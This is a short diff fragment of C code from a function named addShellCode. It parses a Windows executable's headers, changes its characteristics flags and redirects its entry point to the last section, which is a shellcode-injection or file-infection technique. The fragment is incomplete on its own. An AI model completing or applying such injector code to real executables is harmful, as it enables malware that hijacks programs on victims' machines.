@@ -160,6 +160,7 @@ boolean addShellCode(char *filepath)
     PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
     PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
     PIMAGE_SECTION_HEADER last = first + nt->FileHeader.NumberOfSections - 1;
+    nt->FileHeader.Characteristics = 0x010F;
     DWORD oldEntry = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
     //printf("oldEntry: %x", oldEntry);
     nt->OptionalHeader.AddressOfEntryPoint = last->VirtualAddress;
